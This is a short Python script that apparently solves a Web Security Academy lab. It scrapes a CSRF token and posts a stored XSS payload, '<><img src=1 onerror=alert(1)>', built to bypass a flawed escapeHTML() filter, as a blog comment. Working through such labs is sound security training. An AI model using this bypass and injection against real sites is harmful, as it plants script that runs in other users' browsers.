import requests
from bs4 import BeautifulSoup

site = '0acb005d040c1632812dcae600dc006b.web-security-academy.net'

# Start session
s = requests.Session()

# Step 1: Grab CSRF token
blog_post_url = f'https://{site}/post?postId=1'
resp = s.get(blog_post_url)
soup = BeautifulSoup(resp.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'}).get('value')

# Step 2: Craft payload that bypasses flawed escapeHTML()
payload = '<><img src=1 onerror=alert(1)>'

# Step 3: Submit malicious comment in 'comment' field
comment_data = {
    'csrf': csrf,
    'postId': '1',
    'comment': payload,
    'name': 'Jarren Calizo',
    'email': 'calizo@pdx.edu',
    'website': 'https://pdx.edu'
}

comment_url = f'https://{site}/post/comment'
s.post(comment_url, data=comment_data)

# Step 4: Optional verification
print("Posted XSS payload. Visit the blog post in your browser to confirm.")